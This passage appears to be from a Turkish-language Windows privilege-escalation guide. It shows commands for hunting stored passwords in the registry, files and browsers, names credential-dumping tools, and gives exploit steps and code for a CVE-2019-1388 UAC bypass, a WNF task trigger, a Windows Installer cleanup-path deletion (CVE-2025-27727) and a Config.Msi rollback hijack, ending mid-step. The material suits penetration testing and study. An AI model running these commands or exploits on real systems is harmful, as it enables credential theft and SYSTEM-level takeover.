Erişilebilir, silinmiş bir `.pfx` dosyası **code-signing** için de bir ipucu olabilir. Erişilebilir bir özel anahtar içeriyorsa bu anahtar, değiştirilmiş bir PowerShell script'ini imzalayabilir; [PowerShell, özel anahtara sahip bir code-signing sertifikası gerektirir](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature) ve [AppLocker publisher kuralları, imzalayanın kimliğini ve kural kapsamını değerlendirir](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Hesaplar arası yürütme için mevcut kimliğin ilgili script'i değiştirebilmesi, etkili bir kuralın script ve hedef hesap için ortaya çıkan imzayı kabul etmesi ve daha yüksek ayrıcalıklı bir zamanlanmış görevin veya başka bir tüketicinin script'i gerçekten çalıştırması gerekir. Tek başına bir `.pfx` dosya adı, sertifika konusu veya yazılabilir bir script bu zincirin mevcut olduğunu kanıtlamaz. Özel anahtar materyalini açmadan veya görevi tetiklemeden önce metadata'yı, ACL'leri, politikayı ve zamanlanmış komutu inceleyin.

Kimlik bilgileriyle ilgili ipuçları için erişilebilir mesajlaşma istemcisi profil veritabanlarını, notları ve alınan dosyaları da inceleyin. BitLocker kurtarma anahtarı dışa aktarımı HTML veya TXT olarak, bazen de adı olan bir yedek arşivinin içinde saklanabilir. Bu tür materyaller, eski yedekleri içeren ayrı bir şifreli veri birimine erişim sağlayabilir; birimi ve arşivi yalnızca erişim yetkiniz varsa inceleyin. Bir yedek `NTDS.dit` içeriyorsa, çevrimdışı etki alanı kimlik bilgilerinin kurtarılması için [yedekleme ve ayrıcalıklı gruplar iş akışında](../active-directory-methodology/privileged-groups-and-token-privileges.md) açıklandığı gibi eşleşen `SYSTEM` hive'ı da gerekir. Dosya adları ve kilitli bir birim, kullanılabilir bir kurtarma anahtarı veya etki alanı yedeği bulunduğunu tek başına kanıtlamaz.

Çeşitli programların kaydettiği **parolaları kurtarmak** için şunu kullanabilirsiniz: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Kayıt defterinin içinde

**Kimlik bilgileri içerebilecek diğer kayıt defteri anahtarları**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Kayıt defterinden openssh anahtarlarını çıkarın.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Tarayıcı Geçmişi

**Chrome veya Firefox** parolalarının saklandığı veritabanlarını kontrol etmelisiniz.\
**Chrome, Edge veya Firefox** parolalarının saklandığı veritabanlarını kontrol etmelisiniz.\
Ayrıca tarayıcıların geçmişini, yer imlerini ve favorilerini de kontrol edin; parolalar buralarda saklanmış olabilir.

Geçerli kullanıcının standart Edge **Default** profili için `Login Data`, `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default` konumundadır; `Local State` ise üst dizindeki `User Data` klasöründedir. [Microsoft varsayılan profil konumunu belgeliyor](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); başka bir profil veya `UserDataDir` ilkesi bu konumu değiştirebilir. Dosyaların mevcut olması yalnızca kimlik bilgisi deposuna işaret eder: okunabilir dosyaların bulunduğunu, ilgili kullanıcının DPAPI bağlamını veya başka yetkili anahtar materyalini ve kayıtlı girişin daha yüksek ayrıcalıklı bir hesaba ait olup olmadığını doğrulayın. Yalnızca yolları listelemek için veritabanını açmak veya şifresi çözülmüş parolaları yazdırmak gerekmez.

Firefox için [Mozilla'nın belgelerine göre](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) bir profildeki `key4.db` ve `logins.json`, eşleşen anahtar ve şifrelenmiş giriş dosyalarıdır. Bu dosyaların mevcut olması yalnızca bir ipucudur: kimlik bilgilerinin kullanılabilir olduğu sonucuna varmadan önce her iki dosyanın da okunabilir olup olmadığını, kayıtlı girişlerin bulunup bulunmadığını ve Ana Parola'nın anahtarı koruyup korumadığını kontrol edin. Kurtarılan bir kimlik bilgisi etki alanı hesabına aitse, bu hesabın etkin grup denetimi haklarını ve grubun [LAPS parolasını okuma veya şifresini çözme haklarını](../active-directory-methodology/laps.md) ayrı ayrı inceleyin; tarayıcı kalıntıları tek başına bir yönetici erişim yolu olduğunu göstermez.

Tarayıcılardan parola çıkarmaya yönelik araçlar:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)**, Windows işletim sisteminde yerleşik olarak bulunan ve farklı dillerle yazılmış yazılım bileşenlerinin **birbirleriyle iletişim kurmasını** sağlayan bir teknolojidir. Her COM bileşeni bir **sınıf kimliği (CLSID) ile tanımlanır** ve her bileşen, arayüz kimlikleri (IID'ler) ile tanımlanan bir veya daha fazla arayüz üzerinden işlevsellik sunar.

COM sınıfları ve arayüzleri, sırasıyla kayıt defterinde **HKEY\CLASSES\ROOT\CLSID** ve **HKEY\CLASSES\ROOT\Interface** altında tanımlanır. Bu kayıt defteri, **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT** birleştirilerek oluşturulur.

Bu kayıt defterindeki CLSID'lerin altında, bir **DLL**'yi işaret eden **varsayılan değer** ile **Apartment** (Tek İş Parçacıklı), **Free** (Çok İş Parçacıklı), **Both** (Tek veya Çok İş Parçacıklı) ya da **Neutral** (İş Parçacığından Bağımsız) olabilen **ThreadingModel** adlı bir değer içeren alt kayıt defteri **InProcServer32** bulunur.

![Tarayıcı Geçmişi - COM DLL Overwriting: Bu kayıt defterindeki CLSID'lerin altında, bir DLL'yi işaret eden varsayılan değer ile bir değer içeren alt kayıt defteri InProcServer32 bulunur...](<../../images/image (729).png>)

Temel olarak, çalıştırılacak DLL'lerden herhangi birinin **üzerine yazabilirseniz**, bu DLL başka bir kullanıcı tarafından çalıştırıldığında **ayrıcalıkları yükseltebilirsiniz**.

Saldırganların kalıcılık mekanizması olarak COM Hijacking'i nasıl kullandığını öğrenmek için:

{{#ref}}
com-hijacking.md
{{#endref}}

### **Dosya ve kayıt defterinde genel parola araması**

**Dosya içeriklerini arama**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Belirli bir dosya adını arama**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Kayıt defterinde anahtar adlarını ve parolaları arayın**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Parolaları arayan araçlar

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **bir msf** plugin'idir. Bu plugin'i, kurbanın içinde kimlik bilgilerini arayan her metasploit POST modülünü **otomatik olarak çalıştırmak** için oluşturdum.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) bu sayfada bahsedilen parolaları içeren tüm dosyaları otomatik olarak arar.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) bir sistemden parola çıkarmak için kullanılan başka bir harika araçtır.

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) aradığı verileri düz metin olarak kaydeden çeşitli araçlara ait **oturumları**, **kullanıcı adlarını** ve **parolaları** arar (PuTTY, WinSCP, FileZilla, SuperPuTTY ve RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

SYSTEM olarak çalışan bir **process'in full access ile yeni bir process açtığını** (`OpenProcess()`) düşünün. Aynı process, **ana process'in tüm açık handle'larını devralan düşük yetkili bir process de oluşturur** (`CreateProcess()`).\
Ardından, **düşük yetkili process'e full access'iniz varsa**, `OpenProcess()` ile oluşturulan **yetkili process'e ait açık handle'ı alabilir** ve **shellcode enjekte edebilirsiniz**.\
Bu **zafiyetin nasıl tespit edilip exploit edileceği** hakkında daha fazla bilgi için [bu örneği okuyun.](leaked-handle-exploitation.md)\
Farklı izin seviyelerine sahip process ve thread'lerin devraldığı diğer açık handle'ları (yalnızca full access değil) nasıl test edip kötüye kullanacağınıza dair daha kapsamlı bir açıklama için [**bu diğer yazıyı okuyun**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

**Pipe** olarak adlandırılan paylaşımlı bellek segmentleri, process'ler arası iletişim ve veri aktarımını sağlar.

Windows, ilgisiz process'lerin farklı ağlar üzerinden bile veri paylaşmasına olanak tanıyan **Named Pipes** adlı bir özellik sunar. Bu, rollerin **named pipe server** ve **named pipe client** olarak tanımlandığı bir client/server mimarisine benzer.

Bir **client** pipe üzerinden veri gönderdiğinde, pipe'ı kuran **server**, gerekli **SeImpersonate** haklarına sahip olması koşuluyla **client'ın kimliğine bürünebilir**. Taklit edebileceğiniz bir pipe üzerinden iletişim kuran **yetkili bir process** tespit etmek, kurduğunuz pipe ile etkileşime girdiğinde bu process'in kimliğini devralarak **daha yüksek ayrıcalıklar elde etme** fırsatı sunar. Bu saldırının nasıl gerçekleştirileceğine ilişkin yönergeler için [**burada**](named-pipe-client-impersonation.md) ve [**burada**](#from-high-integrity-to-system) yararlı rehberler bulabilirsiniz.

Ayrıca aşağıdaki araç, **burp gibi bir araçla named pipe iletişimini yakalamanızı sağlar:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **ve bu araç, privesc fırsatlarını bulmak için tüm pipe'ları listeleyip görüntülemenizi sağlar** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Server modundaki Telephony service (TapiSrv), `\\pipe\\tapsrv` (MS-TRP) yolunu kullanıma açar. Kimliği doğrulanmış uzak bir client, mailslot tabanlı async event yolunu kötüye kullanarak `ClientAttach` işlemini, `NETWORK SERVICE` tarafından yazılabilir herhangi bir mevcut dosyaya yönelik rastgele bir **4-byte write** işlemine dönüştürebilir; ardından Telephony admin hakları elde edip service olarak rastgele bir DLL yükleyebilir. İşleyişin tamamı:

- `pszDomainUser` değerini yazılabilir mevcut bir path olarak ayarlayarak `ClientAttach` çağrısı yapın → service, dosyayı `CreateFileW(..., OPEN_EXISTING)` ile açar ve async event yazımları için kullanır.
- Her event, `Initialize` işlemindeki saldırgan kontrollü `InitContext` değerini bu handle'a yazar. `LRegisterRequestRecipient` (`Req_Func 61`) ile bir line app kaydedin, `TRequestMakeCall` (`Req_Func 121`) işlemini tetikleyin, `GetAsyncEvents` (`Req_Func 0`) ile alın, ardından deterministik yazımları tekrarlamak için kaydı kaldırıp kapatın.
- `C:\Windows\TAPI\tsec.ini` dosyasındaki `[TapiAdministrators]` bölümüne kendinizi ekleyin, yeniden bağlanın, ardından `GetUIDllName` çağrısına rastgele bir DLL path'i vererek `NETWORK SERVICE` olarak `TSPI_providerUIIdentify` çalıştırın.

Daha fazla ayrıntı:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### Windows'ta kod çalıştırabilecek dosya uzantıları

**[https://filesec.io/](https://filesec.io/)** sayfasına göz atın.

### Markdown renderer'ları üzerinden Protocol handler / ShellExecute kötüye kullanımı

`ShellExecuteExW`'ye iletilen tıklanabilir Markdown bağlantıları, tehlikeli URI handler'larını (`file:`, `ms-appinstaller:` veya kayıtlı herhangi bir scheme) tetikleyebilir ve saldırganın kontrol ettiği dosyaları geçerli kullanıcı olarak çalıştırabilir. Bkz.:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Parolalar için Command Line'ları izleme**

Bir kullanıcı olarak shell aldığınızda, **command line üzerinde kimlik bilgileri ileten** zamanlanmış görevler veya başka process'ler çalıştırılıyor olabilir. Aşağıdaki script, her iki saniyede bir process command line'larını yakalar ve mevcut durumu önceki durumla karşılaştırarak farklılıkları çıktılar.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Süreçlerden parola çalma

## Düşük ayrıcalıklı kullanıcıdan NT\AUTHORITY SYSTEM'e (CVE-2019-1388) / UAC Bypass

Grafik arayüze (konsol veya RDP üzerinden) erişiminiz varsa ve UAC etkinse, Microsoft Windows'un bazı sürümlerinde ayrıcalıksız bir kullanıcıdan terminali veya "NT\AUTHORITY SYSTEM" gibi herhangi bir işlemi çalıştırmak mümkündür.

Bu, aynı güvenlik açığıyla hem ayrıcalıkları yükseltmeyi hem de UAC'yi bypass etmeyi mümkün kılar. Ayrıca herhangi bir şey yüklemeniz gerekmez ve işlem sırasında kullanılan binary, Microsoft tarafından imzalanmış ve yayımlanmıştır.

Etkilenen sistemlerden bazıları şunlardır:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Bu güvenlik açığından yararlanmak için aşağıdaki adımları gerçekleştirmek gerekir:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Gerekli tüm dosyalara ve bilgilere şu GitHub deposundan ulaşabilirsiniz:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium'dan High Integrity Level'a / UAC Bypass

**Integrity Levels** hakkında bilgi edinmek için bunu okuyun:


{{#ref}}
integrity-levels.md
{{#endref}}

Ardından **UAC ve UAC bypasses** hakkında bilgi edinmek için bunu okuyun:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Sunulan Bir Kök Dizine Upload Directory Junctions

Bir uygulama tahmin edilebilir bir upload alt dizini oluşturabilir, çağıranın sağladığı dosya adını bu dizine yazabilir ve ardından dosyayı işleyebilir. Düşük yetkili bir kullanıcı, sunucu tarafındaki yazma işleminden önce bu alt dizini silip yerine bir NTFS junction koyabiliyorsa, yazma işlemi junction'ı izleyerek web tarafından sunulan bir dizine ulaşabilir. Sunucu bu dosya türünü çalıştırıyorsa, buraya yerleştirilen bir script web-service kimliğiyle çalışabilir. Bu, uygulamaya özgü bir rastgele yazma sınırıdır; yalnızca yazılabilir bir upload dizininin veya mevcut bir junction'ın bulunması bunu kanıtlamaz.

Upload handler'daki tam yol oluşturma mantığını ve zamanlamayı, kullanıcının alt dizini silme ve oluşturma üzerindeki etkin haklarını, hedefin etkin ACL'lerini, yazma işlemini yapan bileşenin reparse point'leri izleyip izlemediğini ve web sunucusunun hedefteki dosyaları çalıştırıp çalıştırmadığını kontrol edin. Yazma işlemini yapan bileşenin ve web sunucusunun process identity'lerini ayrı ayrı doğrulayın. Pasif envanter çıkarma işlemi dizin ACL'lerini ve reparse metadata'sını gösterebilir; ancak handler'ın davranışını veya gelecekteki bir junction değişimini kanıtlayamaz. Çalıştırma bir service account altında gerçekleşiyorsa, ayrı bir token-privilege yolunu değerlendirmeden önce **gerçek process token'ını** inceleyin.

## WNF-triggered privileged scheduled-task cleanup

Elle çalıştırılmasına izin vermeyen bir scheduled task, yine de ayrıcalıksız bir tetikleme yöntemi sunabilir. Ayrıcalıklı bir task'ı denetlerken XML'ini dışa aktarın ve task DACL'sini, principal'ını ve action'ını olduğu kadar **tüm** trigger'larını da inceleyin. Özellikle, `WnfStateChangeTrigger` bir Windows Notification Facility (WNF) state'ini belirtir. Bu securable state mevcut kullanıcının güncelleme yayımlamasına izin veriyorsa, kullanıcı `<AllowStartOnDemand>false</AllowStartOnDemand>` olmasına rağmen task'ı yapılandırılmış kimliği altında dolaylı olarak başlatabilir.<sup>[[43]](#references)</sup>

Örneğin, Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` task'ı SYSTEM olarak çalışıyor, standart bir kullanıcının WNF state `7508BCA32C079E41` için güncelleme yayımlamasını kabul ediyor ve Recall devre dışı olsa bile `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` yolunu inceliyordu.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Erişilebilirliği test etmek için `ZwUpdateWnfStateData` işlevini `ntdll.dll` içinden çözümleyin, sekiz baytlık durum adı için boş bir güncelleme gönderin ve döndürülen durumu görevin son çalıştırılma verileriyle veya Procmon etkinliğiyle karşılaştırın. Aşağıdaki basitleştirilmiş yoklama, Recall görevi örneğindeki bayt dizisini kullanır; test edilen görev için dışa aktarılan baytlarla değiştirin.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Recursive cleanup'ı ayrıcalıklı silmeye dönüştürme

İşe yarayan primitive yalnızca tetikleyici değil, saldırgan denetimindeki bir dizini kabul eden ayrıcalıklı bir cleanup rutinidir. İşlemi dizinlemeden son değişikliğe kadar izleyin: profil/oturum keşfi, wildcard ile seçilen alt öğeler, `SHCreateItemFromParsingName` ve `IFileOperation::DeleteItem`, önceden denetlenmiş bir yol adının daha sonra recursive olarak izleneceğinin güçlü göstergeleridir. Alt öğeler güvenilir dizin tanıtıcılarına göre açılıp silinmeden önce doğrulanmıyorsa, saldırgan dizinleme ile kullanım arasında çözümlemeyi değiştirebilir.<sup>[[43]](#references)</sup>

WNF tetikleyicisini aşağıda açıklanan [oplock, junction and Object Manager symlink substitution](#from-folder-contents-delete-to-system-eop) ile eşleştirin: oplock, meşru alt öğeyi seçtikten sonra cleaner'ı duraklatırken yazılabilir üst dizin değiştirilir; böylece devam eden ayrıcalıklı silme işlemi `\RPC Control` üzerinden korunan hedefe yönlendirilir. Recall zincirinde bu, belgelenmiş MSI rollback tekniği için gereken `C:\Config.Msi` dizininin SYSTEM tarafından silinmesini sağladı.<sup>[[31]](#references)[[43]](#references)</sup>

### İç içe alt öğeler, yüzeysel reparse-point düzeltmelerini aşar

Yalnızca saldırgan denetimindeki kökü ve doğrudan alt öğesini doğrulamak, recursive ve yol adına dayalı bir silme işlemini güvenli hâle getirmez. Denetlenmiş bu nesneleri meşru tutun ve junction/oplock değiştirme işlemini bunların altındaki ek bir alt öğeye taşıyın; `IFileOperation::DeleteItem` sonunda doğrulanmamış alt öğeye ulaşır ve yeni hedefini izler. İlk Recall yaması `UKP` dizinini ve GUID biçimli dizini doğrulamasına rağmen eski recursive silme işlemini koruduğundan, CVE-2026-20941 tam olarak bu tür eksik bir düzeltmeyle ortaya çıktı.<sup>[[43]](#references)</sup>

Güvenli yaklaşım, **her alt öğeyi** önceden güvenilir bir dizin tanıtıcısına göre açmak, çözümlenmiş son yolu/nesneyi alıp doğrulamak ve silme disposition'ını doğrulanmış tanıtıcıya uygulamaktır. Bir öneki doğrulayıp ardından recursive ve yol adına dayalı silme işlemine geri dönmeyin. Yama incelemesi sırasında gerçek çağrı noktasındaki yapıları da inceleyin: bu durumda `NtCreateFile` çağrısında `OBJECT_ATTRIBUTES` yapısının çalışma zamanında incelenmesi, `RootDirectory` alanının null olmadığını ve `{GUID}\\secure_file.lock` adının göreli olduğunu göstererek, ikinci bir `FILE_DELETE_ON_CLOSE` primitive'i olduğunu ima eden yanıltıcı decompiler çıktısını çürüttü.<sup>[[43]](#references)</sup>

## Arbitrary Folder Delete/Move/Rename ile SYSTEM EoP

Teknik, [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) içinde açıklanmıştır; exploit kodu [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Saldırı temel olarak, kaldırma işlemi sırasında meşru dosyaları kötü amaçlı dosyalarla değiştirmek için Windows Installer'ın rollback özelliğini kötüye kullanır. Bunun için saldırganın, `C:\Config.Msi` klasörünü ele geçirmek üzere kullanılacak **malicious MSI installer** oluşturması gerekir. Bu klasör daha sonra Windows Installer tarafından diğer MSI paketlerinin kaldırılması sırasında rollback dosyalarını depolamak için kullanılır; bu dosyalar, kötü amaçlı payload'ı içerecek şekilde değiştirilmiş olur.

### Windows Installer COM cleanup-path injection (CVE-2025-27727)

Düşük ayrıcalıklı bir istemci, `CMsiConfigurationManager` COM nesnesi (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`) üzerinden SYSTEM yetkileriyle çalışan `msiexec.exe` hizmetine erişebilir. Tersine mühendislik, ilgili `IMsiServer` çağrılarını vtable içindeki `0xA0` offset'inde `MsiBeginTransactionW`, `0xC8` offset'inde `SetEEUIDirectoryAndFilter` ve `0x50` offset'inde `CleanupTempPackages` olarak belirledi. Bu adlar ve offset'ler tersine mühendislikle elde edilmiştir ve farklı build'lerde değişebilir.<sup>[[41]](#references)</sup>

Yönetici olmayan bir kullanıcı için `SetEEUIDirectoryAndFilter`, yalnızca sağlanan yolu `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` ve `FILE_FLAG_OPEN_REPARSE_POINT` ile açarken çağıranı taklit eder. Bu, çağıranın dizini silebildiğini kanıtlar ve bir reparse point'in izlenmesini önler; ancak denetlenen dosya nesnesini sonraki cleanup işlemine bağlamaz veya dosyanın Windows Installer tarafından oluşturulduğunu kanıtlamaz.<sup>[[41]](#references)</sup>

`MsiBeginTransactionW` çağrısından sonra `SetEEUIDirectoryAndFilter`, çağıranın filter argümanından bağımsız olarak yolu klasör olarak zamanlar. Hizmet, `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages` altında adlandırılmış bir `REG_DWORD` değeri yazar: değer adı çağıranın denetimindeki yoldur; `0x00000002` verisi ise klasör bayrağıdır. Ardından `CleanupTempPackages(NULL, FALSE)` doğrudan cleanup işlemine girer. Yükseltilmiş worker, kayıt defteri değerlerini listeler ve klasör girdilerini yolun kaynağını denetlemeden recursive `FDeleteFolder` işlevine iletir. Normal kaldırma başarısız olursa kod ayrıca `LockdownPath` işlevini çağırır, dosya özniteliklerini temizler ve yeniden dener.<sup>[[41]](#references)</sup>

`msi.dll` dosyasından elde edilen minimal çağrı sırası şöyledir:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Kullanışlı primitive, junction yönlendirmesi değil, path reuse'dur. Saldırganın oluşturduğu `C:\Config.Msi` yolunu kaydedin, silin ve Windows Installer'ın daha sonra aynı pathname'i korumalı rollback verileriyle yeniden oluşturmasını bekleyin. Temizleme işlemi eski `TempPackages` adına güvenir ve yeni dizini SYSTEM olarak siler. Reparse point gerekmediğinden bu yöntem, `FILE_FLAG_OPEN_REPARSE_POINT` ve redirection-trust mitigation ile amaçlanan sınırı aşar.<sup>[[41]](#references)</sup>

Bu silme primitive'i aşağıdaki rollback zincirine uyar: ayrı `Installer\Folders` kaydını koruyun, korumalı `C:\Config.Msi` yolunu silin, NULL DACL ile yeniden oluşturun ve installer DACL'i sıkılaştırmadan önce `WRITE_DAC` izni verilmiş bir handle tutun. Önceden açılmış handle, `NtSetSecurityObject` ile izin verici bir DACL'i geri yükleyebilir; ardından rollback devam etmeden önce oluşturulan `.rbs` değiştirilebilir.<sup>[[41]](#references)</sup>

Microsoft, yeni feature gate etkinleştirildiğinde `CMsiTransaction::SetEEUIDirectoryAndFilter` fonksiyonunun `ScheduleFileOrFolderDelete` çağırmasını engelleyerek bu yolu düzeltti. COM çağrısı yine de başarı döndürebilir, ancak artık saldırganın kontrolündeki yolu `TempPackages` içine eklemez. Yama testi olarak method çağrısının başarıyla dönmesine güvenmek yerine Nisan 2025 Windows güvenlik güncellemelerini uygulayın.<sup>[[41]](#references)[[42]](#references)</sup>

Özetlenen teknik şöyledir:

1. **Aşama 1 – Hijack için Hazırlık (`C:\Config.Msi` klasörünü boş bırakın)**

- Adım 1: MSI'ı yükleyin
    - Yazılabilir bir klasöre (`TARGETDIR`) zararsız bir dosya (ör. `dummy.txt`) yükleyen bir `.msi` oluşturun.
    - Installer'ı **"UAC Compliant"** olarak işaretleyin; böylece **admin olmayan bir kullanıcı** çalıştırabilir.
    - Yüklemeden sonra dosyaya ait bir **handle** açık tutun.

- Adım 2: Uninstall işlemini başlatın
    - Aynı `.msi` dosyasını uninstall edin.
    - Uninstall işlemi dosyaları `C:\Config.Msi` içine taşımaya ve `.rbf` dosyaları (rollback yedekleri) olarak yeniden adlandırmaya başlar.
    - Dosyanın `C:\Config.Msi\<random>.rbf` haline geldiğini algılamak için açık dosya handle'ını `GetFinalPathNameByHandle` ile **poll edin**.

- Adım 3: Özel senkronizasyon
    - `.msi`, aşağıdakileri yapan bir **özel uninstall action (`SyncOnRbfWritten`)** içerir:
        - `.rbf` dosyasının yazıldığını bildirir.
        - Ardından uninstall işlemine devam etmeden önce başka bir event'i **bekler**.

- Adım 4: `.rbf` dosyasının silinmesini engelleyin
    - Bildirim gelince `.rbf` dosyasını `FILE_SHARE_DELETE` olmadan **açın** — bu, dosyanın **silinmesini engeller**.
    - Ardından uninstall işleminin tamamlanabilmesi için geri bildirim verin.
    - Windows Installer `.rbf` dosyasını silemez; tüm içeriği silemediği için **`C:\Config.Msi` kaldırılmaz**.

- Adım 5: `.rbf` dosyasını elle silin
    - `.rbf` dosyasını (saldırgan olarak) elle silin.
    - Artık **`C:\Config.Msi` boştur** ve hijack edilmeye hazırdır.

> Bu noktada, `C:\Config.Msi` yolunu silmek için **SYSTEM seviyesinde arbitrary folder delete vulnerability**'yi tetikleyin.

2. **Aşama 2 – Rollback Script'lerini Kötücül Olanlarla Değiştirme**

- Adım 6: `C:\Config.Msi` yolunu zayıf ACL'lerle yeniden oluşturun
    - `C:\Config.Msi` klasörünü kendiniz yeniden oluşturun.
    - **Zayıf DACL'ler** (ör. Everyone:F) ayarlayın ve `WRITE_DAC` izni olan bir handle'ı **açık tutun**.

- Adım 7: Başka bir install çalıştırın
    - `.msi` dosyasını yeniden yükleyin. Şunları kullanın:
        - `TARGETDIR`: Yazılabilir bir konum.
        - `ERROROUT`: Zorunlu bir hatayı tetikleyen bir değişken.
    - Bu install, `.rbs` ve `.rbf` dosyalarını okuyan **rollback** işlemini yeniden tetiklemek için kullanılacaktır.

- Adım 8: `.rbs` dosyasını izleyin
    - Yeni bir `.rbs` görünene kadar `C:\Config.Msi` yolunu izlemek için `ReadDirectoryChangesW` kullanın.
    - Dosya adını alın.

- Adım 9: Rollback öncesinde senkronize edin
    - `.msi`, aşağıdakileri yapan bir **özel install action (`SyncBeforeRollback`)** içerir:
        - `.rbs` oluşturulduğunda bir event'i bildirir.
        - Ardından devam etmeden önce **bekler**.

- Adım 10: Zayıf ACL'leri yeniden uygulayın
    - `.rbs created` event'ini aldıktan sonra:
        - Windows Installer, `C:\Config.Msi` yoluna **güçlü ACL'leri yeniden uygular**.
        - Ancak `WRITE_DAC` izinli bir handle hâlâ sizde olduğundan **zayıf ACL'leri yeniden uygulayabilirsiniz**.

> ACL'ler **yalnızca handle açılırken uygulanır**; bu nedenle klasöre yazmaya devam edebilirsiniz.

- Adım 11: Sahte `.rbs` ve `.rbf` dosyalarını bırakın
    - Windows'a şunları yapmasını söyleyen **sahte bir rollback script** ile `.rbs` dosyasının üzerine yazın:
